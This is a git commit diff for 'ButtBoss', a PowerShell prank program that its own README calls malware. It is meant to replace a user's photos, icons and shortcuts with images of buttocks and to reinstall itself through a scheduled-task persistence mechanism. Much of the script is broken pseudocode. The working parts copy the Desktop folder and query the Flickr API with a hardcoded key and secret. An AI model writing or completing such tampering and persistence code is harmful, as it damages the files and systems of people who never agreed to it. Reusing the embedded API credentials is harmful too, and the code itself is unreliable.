947524bdbef66c78d69795bac77bb9b405556588
mellonaut <rleeazw@outlook.com>
2022-04-23 14:23:12 -0400

    Flickr
    Getting somewhere

--- README.md
+++ README.md
@@ -1,2 +1,6 @@
 # ButtBoss
  A True Delight
+
+The kind of Malware you can live with. 
+
+Changes all your photos to butts, your desktop icons tp butts, and any shortcuts will open to photos of butts. It will uninstall itself aftr 15 minutes, but will create a persistence mechanism that will have it run a scheduled task and reinstall every X days.
--- buttboss.ps1
+++ buttboss.ps1
@@ -2,13 +2,36 @@
 # Copy Desktop to Goofin for safe keeping
 Copy-Item -Path "$home\Desktop" -Destination "C:\Goofin\cuts" -Recurse 
 
-$targets = (gci $home\Desktop\ -Recurse) 
-for each $target in $targets
 
-        Webrequest ImageSearch "juicy-ass-butt-%RANDOMNUMBER%"
-        Save to goofin/butts directory as butt1.png, butt2.png, butt3.png 
-        Cat butts dir and store in $butts 
-    for eah target in targets
+
+
+if OneDrive installed then
+$targets = (gci $home\OneDrive\Desktop\ -Recurse) 
+$buttnum = echo $targets | Measure-Object
+
+
+function Search-Flickr ([string]$tags, [int]$count = $buttnum) 
+{
+    $api_key = "cb00a11683798919c3264dfb4ff2ad61"
+    $secret = "bb19a60407fb6a2b"
+    $search = Invoke-RestMethod -Uri "http://api.flickr.com/services/rest/?method=flickr.photos.search&api_key=$api_key&secret=$secret&tags=$tags&extras=url_z&content_type=1&per_page=$count&format=rest" -Method Get
+    $search = [xml] $search
+
+Write-Verbose $search.OuterXml
+
+$url = $search.rsp.photos.photo.url_z
+if ($url -eq $null -or $url[0] -eq $null) {
+    return
+	}
+return $url
+}
+
+# Main method for obtaining sweet butt shots for grand plan  
+$buttno = (Get-Random -Maximum 100) 
+$topic = "juicy butts "+(Get-Random -Maximum 100) 
+$url = Search-Flickr $topic
+
+    for each target in targets
         Where extension = any image extension
             Copy each item with original filename to Goofin/cuts        
             Loop through and replace file with $butts content sequentially, starting over if more targets > butts
@@ -20,8 +43,11 @@ for each $target in $targets
 cd Desktop  notepad buttboss.txt writefile "Now who's boss."  
 
 
+# Politeness Module
+# Reset the photots and icons after X minutes
 
-# Persistence mechanisms
+
+# Persistence Module
 
 # Schduled task for the script
 # Could we set it to choose a number between 7-20 = x and create a that runs every x days?
